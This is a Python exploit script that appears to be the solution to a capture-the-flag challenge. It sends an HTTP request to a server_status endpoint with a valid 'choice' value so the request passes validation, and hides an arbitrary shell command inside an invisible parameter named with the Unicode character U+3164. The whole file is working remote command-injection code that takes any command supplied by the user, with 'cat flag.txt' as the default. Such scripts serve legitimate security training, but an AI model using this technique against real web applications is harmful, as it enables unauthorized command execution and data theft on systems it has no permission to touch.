#!/usr/bin/env python3
"""
Hidden Path CTF Challenge - Solution Script

This script exploits a Unicode parameter injection vulnerability to execute
arbitrary commands on the target server.

Vulnerability: The app accepts a Unicode HANGUL FILLER (U+3164) parameter
that appears invisible but can contain malicious commands.

Target: http://target:1337/server_status
Category: Misc / Web

Author: CTF Team
Date: 2025
"""

import requests
import sys
import urllib.parse

# Colors for output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    """Print solution banner"""
    print("=" * 60)
    print(f"{Colors.HEADER}Hidden Path CTF Challenge - Exploit{Colors.ENDC}")
    print("=" * 60)
    print(f"Vulnerability: Unicode Parameter Injection (U+3164)")
    print("=" * 60)
    print()

def exploit_command_injection(target_url, command="cat flag.txt"):
    """
    Exploit the Unicode parameter injection vulnerability
    
    Args:
        target_url (str): The base URL of the target
        command (str): The command to execute (default: cat flag.txt)
        
    Returns:
        str: Command output or None on failure
    """
    print(f"{Colors.OKBLUE}[*] Target: {target_url}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] Command: {command}{Colors.ENDC}")
    print(f"{Colors.OKCYAN}[*] Crafting exploit payload...{Colors.ENDC}")
    
    # The invisible Unicode parameter (HANGUL FILLER U+3164)
    unicode_param = '\u3164'
    
    # Craft the payload
    # We send choice=0 to pass validation, but the Unicode param contains our command
    payload = {
        'choice': '0',  # Valid choice to bypass bounds check
        unicode_param: command  # Hidden parameter with our command
    }
    
    print(f"{Colors.OKCYAN}[*] Payload parameters:{Colors.ENDC}")
    print(f"    choice: 0 (passes validation)")
    print(f"    {repr(unicode_param)}: {command} (invisible parameter)")
    print()
    
    try:
        print(f"{Colors.OKCYAN}[*] Sending exploit request...{Colors.ENDC}")
        
        endpoint = f"{target_url}/server_status"
        response = requests.post(
            endpoint,
            data=payload,
            timeout=10
        )
        
        print(f"{Colors.OKCYAN}[*] Response Status: {response.status_code}{Colors.ENDC}")
        
        if response.status_code == 200:
            output = response.text.strip()
            
            if output:
                print(f"{Colors.OKGREEN}[+] Command executed successfully!{Colors.ENDC}")
                return output
            else:
                print(f"{Colors.WARNING}[!] Command executed but returned empty response{Colors.ENDC}")
                return None
        else:
            print(f"{Colors.FAIL}[!] Unexpected status code: {response.status_code}{Colors.ENDC}")
            print(f"{Colors.FAIL}[!] Response: {response.text[:200]}{Colors.ENDC}")
            return None
            
    except requests.exceptions.ConnectionError:
        print(f"{Colors.FAIL}[!] Connection failed - Is the target running?{Colors.ENDC}")
        return None
    except requests.exceptions.Timeout:
        print(f"{Colors.FAIL}[!] Request timeout{Colors.ENDC}")
        return None
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
        return None

def main():
    """Main exploitation flow"""
    print_banner()
    
    # Parse command line arguments
    if len(sys.argv) < 2:
        print(f"{Colors.WARNING}Usage: {sys.argv[0]} <target_url> [command]{Colors.ENDC}")
        print(f"Example: {sys.argv[0]} http://localhost:1337")
        print(f"Example: {sys.argv[0]} http://target:1337 'cat flag.txt'")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    command = sys.argv[2] if len(sys.argv) > 2 else "cat flag.txt"
    
    # Execute the exploit
    result = exploit_command_injection(target_url, command)
    
    if result:
        print()
        print("=" * 60)
        print(f"{Colors.OKGREEN}{Colors.BOLD}[+] OUTPUT:{Colors.ENDC}")
        print("=" * 60)
        print(result)
        print("=" * 60)
        
        # Check if it looks like a flag
        if 'HTB{' in result or 'FLAG{' in result or 'flag{' in result:
            print(f"{Colors.OKGREEN}{Colors.BOLD}[+] FLAG CAPTURED!{Colors.ENDC}")
        
        return 0
    else:
        print()
        print(f"{Colors.FAIL}[!] Exploitation failed{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Troubleshooting tips:{Colors.ENDC}")
        print(f"    1. Verify the target URL is correct and reachable")
        print(f"    2. Check that the challenge is running (curl -I {target_url})")
        print(f"    3. Ensure the flag file exists and is readable")
        print(f"    4. Try a simple command like 'whoami' or 'ls'")
        return 1

if __name__ == "__main__":
    sys.exit(main())
